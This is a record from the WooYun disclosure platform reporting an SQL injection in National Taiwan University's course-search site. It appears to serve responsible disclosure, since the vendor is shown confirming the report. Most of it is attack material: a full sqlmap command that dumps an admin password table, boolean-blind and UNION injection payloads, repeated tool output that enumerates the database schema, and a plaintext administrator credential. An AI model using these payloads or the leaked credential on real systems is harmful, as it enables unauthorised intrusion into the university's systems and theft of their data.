{"id": 81220, "wybug_id": "wooyun-2015-0154228", "wybug_title": "臺大課程網某處存在SQL植入漏洞（27萬課程信息泄露+acadmin明文密碼泄露）（臺灣地區）", "wybug_corp": "國立臺灣大學", "wybug_author": "路人甲", "wybug_date": "2015-11-20 18:35", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(Hitcon台湾互联网漏洞报告平台)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["植入漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： 臺大課程網某處存在SQL植入漏洞---27萬課程信息泄露+acadmin明文密碼泄露 详细说明：  地址：http://**.**.**.**/nol/coursesearch/print_table.php?course_id=104%2014800&class=&dpt_code=0000&ser_no=10105&semester=97-2\npython sqlmap.py -u \"http://**.**.**.**/nol/coursesearch/print_table.php?course_id=104%2014800&class=&dpt_code=0000&ser_no=10105&semester=97-2\" -p ser_no --technique=BU --random-agent --batch -D public -T admin_password -C account,password --dump\n\nDatabase: public+-------------------------+---------+| Table                   | Entries |+-------------------------+---------+| aca_course              | 274528  |\n\nDatabase: publicTable: aca_course[44 columns]+---------------+---------+| Column        | Type    |+---------------+---------+| year          | varchar || chgitem       | varchar || class_no      | varchar || co_chg        | varchar || co_gmark      | varchar || co_rep        | varchar || co_select     | varchar || co_tp         | varchar || cou_teacno    | varchar || course_no     | varchar || credit        | varchar || crs_cname     | varchar || crs_ename     | varchar || day1          | varchar || day2          | varchar || day3          | varchar || day4          | varchar || day5          | varchar || day6          | varchar || day7          | varchar || dpt_abbr      | varchar || dpt_code      | bpchar  || engmark       | bpchar  || eno           | float8  || forh          | varchar || limited       | varchar || mark          | varchar || place         | varchar || place_2       | varchar || place_3       | varchar || place_4       | varchar || place_5       | varchar || place_6       | varchar || pre_course    | bpchar  || sel_code      | varchar || semester      | varchar || ser_no        | varchar || sno           | float8  || tea_code      | varchar || teacher_cname | varchar || teacher_ename | varchar || tno           | float8  || week          | varchar || year_code     | varchar |+---------------+---------+\n\nDatabase: publicTable: admin_password[3 entries]+---------+------------+| account | password   |+---------+------------+| 1       | 2          || 2       | 1          || acadmin | acadmin123 |+---------+------------+\n   漏洞证明：  \n---Parameter: ser_no (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: course_id=104 14800&class=&dpt_code=0000&ser_no=10105' AND 8244=8244 AND 'rMil'='rMil&semester=97-2    Type: UNION query    Title: Generic UNION query (NULL) - 46 columns    Payload: course_id=104 14800&class=&dpt_code=0000&ser_no=-7548' UNION ALL SELECT 'qxzzq'||'HxXjWdBxPJejOJUThPKDuDfpOgdqrpDnliAuofXh'||'qvpvq',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&semester=97-2---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.17back-end DBMS: PostgreSQLcurrent user:    'curri'current user is DBA:    Falsedatabase management system users [2]:[*] curri[*] postgresDatabase: public+-------------------------+---------+| Table                   | Entries |+-------------------------+---------+| aca_course              | 274528  || ifcrftr                 | 86190   || english                 | 12168   || ifcrfte                 | 5972    || tea_emp                 | 5654    || cou3                    | 4889    || counter                 | 2138    || cou2                    | 1812    || ifcrfcr                 | 852     || ifcrfyl                 | 750     || com                     | 670     || cougrp                  | 612     || coudept                 | 348     || dep_unit                | 314     || inengtech               | 304     || commopt                 | 172     || asforcou                | 69      || ifcrfsl                 | 58      || ifcrfyln                | 31      || sys_config              | 9       || bulletin                | 6       || admin_password          | 3       || user_session            | 1       |+-------------------------+---------+Database: information_schema+-------------------------+---------+| Table                   | Entries |+-------------------------+---------+| sql_features            | 439     || sql_sizing              | 23      || sql_implementation_info | 12      || sql_packages            | 10      || sql_languages           | 2       |+-------------------------+---------+Database: pg_catalog+-------------------------+---------+| Table                   | Entries |+-------------------------+---------+| pg_depend               | 4253    || pg_attribute            | 2742    || pg_proc                 | 1859    || pg_description          | 1677    || pg_operator             | 643     || pg_class                | 345     || pg_amop                 | 338     || pg_type                 | 329     || pg_cast                 | 256     || pg_index                | 130     || pg_conversion           | 116     || pg_amproc               | 109     || pg_aggregate            | 75      || pg_opclass              | 73      || pg_rewrite              | 66      || pg_attrdef              | 14      || pg_constraint           | 9       || pg_pltemplate           | 6       || pg_namespace            | 5       || pg_am                   | 4       || pg_database             | 4       || pg_language             | 4       || pg_trigger              | 3       || pg_tablespace           | 2       || pg_shdepend             | 1       |+-------------------------+---------+columns LIKE 'pass' were found in the following databases:Database: pg_catalogTable: pg_authid[1 column]+-------------+------+| Column      | Type |+-------------+------+| rolpassword | text |+-------------+------+Database: pg_catalogTable: pg_shadow[1 column]+--------+------+| Column | Type |+--------+------+| passwd | text |+--------+------+Database: pg_catalogTable: pg_user[1 column]+--------+------+| Column | Type |+--------+------+| passwd | text |+--------+------+Database: pg_catalogTable: pg_roles[1 column]+-------------+------+| Column      | Type |+-------------+------+| rolpassword | text |+-------------+------+Database: publicTable: guest_info[1 column]+----------+---------+| Column   | Type    |+----------+---------+| password | varchar |+----------+---------+Database: publicTable: theguest[1 column]+----------+---------+| Column   | Type    |+----------+---------+| password | varchar |+----------+---------+Database: publicTable: admin_password[1 column]+----------+---------+| Column   | Type    |+----------+---------+| password | varchar |+----------+---------+Database: publicTable: admin_password_index[1 column]+----------+---------+| Column   | Type    |+----------+---------+| password | varchar |+----------+---------+Database: publicTable: admin_password_pri[1 column]+----------+---------+| Column   | Type    |+----------+---------+| password | varchar |+----------+---------+Database: pg_catalogTable: pg_user[2 entries]+----------+| passwd   |+----------+| ******** || ******** |+----------+Database: pg_catalogTable: pg_roles[2 entries]+-------------+| rolpassword |+-------------+| ********    || ********    |+-------------+Database: publicTable: admin_password[3 entries]+------------+| password   |+------------+| 1          || 2          || acadmin123 |+------------+sqlmap resumed the following injection point(s) from stored session:---Parameter: ser_no (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: course_id=104 14800&class=&dpt_code=0000&ser_no=10105' AND 8244=8244 AND 'rMil'='rMil&semester=97-2    Type: UNION query    Title: Generic UNION query (NULL) - 46 columns    Payload: course_id=104 14800&class=&dpt_code=0000&ser_no=-7548' UNION ALL SELECT 'qxzzq'||'HxXjWdBxPJejOJUThPKDuDfpOgdqrpDnliAuofXh'||'qvpvq',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&semester=97-2---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.17back-end DBMS: PostgreSQLavailable databases [3]:[*] information_schema[*] pg_catalog[*] publicsqlmap resumed the following injection point(s) from stored session:---Parameter: ser_no (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: course_id=104 14800&class=&dpt_code=0000&ser_no=10105' AND 8244=8244 AND 'rMil'='rMil&semester=97-2    Type: UNION query    Title: Generic UNION query (NULL) - 46 columns    Payload: course_id=104 14800&class=&dpt_code=0000&ser_no=-7548' UNION ALL SELECT 'qxzzq'||'HxXjWdBxPJejOJUThPKDuDfpOgdqrpDnliAuofXh'||'qvpvq',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&semester=97-2---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.17back-end DBMS: PostgreSQLDatabase: publicTable: aca_course[44 columns]+---------------+---------+| Column        | Type    |+---------------+---------+| year          | varchar || chgitem       | varchar || class_no      | varchar || co_chg        | varchar || co_gmark      | varchar || co_rep        | varchar || co_select     | varchar || co_tp         | varchar || cou_teacno    | varchar || course_no     | varchar || credit        | varchar || crs_cname     | varchar || crs_ename     | varchar || day1          | varchar || day2          | varchar || day3          | varchar || day4          | varchar || day5          | varchar || day6          | varchar || day7          | varchar || dpt_abbr      | varchar || dpt_code      | bpchar  || engmark       | bpchar  || eno           | float8  || forh          | varchar || limited       | varchar || mark          | varchar || place         | varchar || place_2       | varchar || place_3       | varchar || place_4       | varchar || place_5       | varchar || place_6       | varchar || pre_course    | bpchar  || sel_code      | varchar || semester      | varchar || ser_no        | varchar || sno           | float8  || tea_code      | varchar || teacher_cname | varchar || teacher_ename | varchar || tno           | float8  || week          | varchar || year_code     | varchar |+---------------+---------+sqlmap resumed the following injection point(s) from stored session:---Parameter: ser_no (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: course_id=104 14800&class=&dpt_code=0000&ser_no=10105' AND 8244=8244 AND 'rMil'='rMil&semester=97-2    Type: UNION query    Title: Generic UNION query (NULL) - 46 columns    Payload: course_id=104 14800&class=&dpt_code=0000&ser_no=-7548' UNION ALL SELECT 'qxzzq'||'HxXjWdBxPJejOJUThPKDuDfpOgdqrpDnliAuofXh'||'qvpvq',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&semester=97-2---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.17back-end DBMS: PostgreSQLDatabase: publicTable: admin_password[2 columns]+----------+---------+| Column   | Type    |+----------+---------+| account  | varchar || password | varchar |+----------+---------+sqlmap resumed the following injection point(s) from stored session:---Parameter: ser_no (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: course_id=104 14800&class=&dpt_code=0000&ser_no=10105' AND 8244=8244 AND 'rMil'='rMil&semester=97-2    Type: UNION query    Title: Generic UNION query (NULL) - 46 columns    Payload: course_id=104 14800&class=&dpt_code=0000&ser_no=-7548' UNION ALL SELECT 'qxzzq'||'HxXjWdBxPJejOJUThPKDuDfpOgdqrpDnliAuofXh'||'qvpvq',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&semester=97-2---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.17back-end DBMS: PostgreSQLDatabase: publicTable: admin_password[3 entries]+---------+------------+| account | password   |+---------+------------+| 1       | 2          || 2       | 1          || acadmin | acadmin123 |+---------+------------+\n   修复方案：  上WAF。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2015-11-24 08:13 厂商回复： 感謝通報 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}